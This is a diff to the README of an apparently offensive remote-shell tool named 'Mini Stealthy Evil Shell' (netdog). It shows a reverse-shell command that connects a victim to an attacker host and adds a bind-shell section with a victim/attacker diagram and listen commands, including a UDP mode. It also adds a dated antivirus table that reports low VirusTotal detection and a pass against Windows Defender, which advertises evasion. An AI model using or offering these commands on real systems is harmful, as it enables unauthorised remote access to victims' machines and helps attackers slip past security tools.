@@ -33,7 +33,23 @@ Mini Stealthy Evil Shell
 ./nd -host 10.1.1.1 # connect to attacker port 1234
 ```
 
+## Bind shell
+```
++------------+            +------------+
+|            |            |            |
+|   victim   <------------+  attacker  |
+|  (netdog)  |            |  10.1.1.1  |
+|            |            |            |
++------------+            +------------+
+```
+```bash
+./nd -l -host 10.1.1.1 # listen on port 1234
+./nd -l -u # udp mode
+```
+
 ## AV status
+2021-05-23 03:13:04 UTC
+
 | type | size | score | windows defender |
 | - | - | -| - |
 |without upx | 2.2 MB|[4/69](https://www.virustotal.com/gui/file/b042c2498ab6ee36ce998842d4ed4592d46f55026677f1f6e750edf7b6a2411d/detection)| pass|
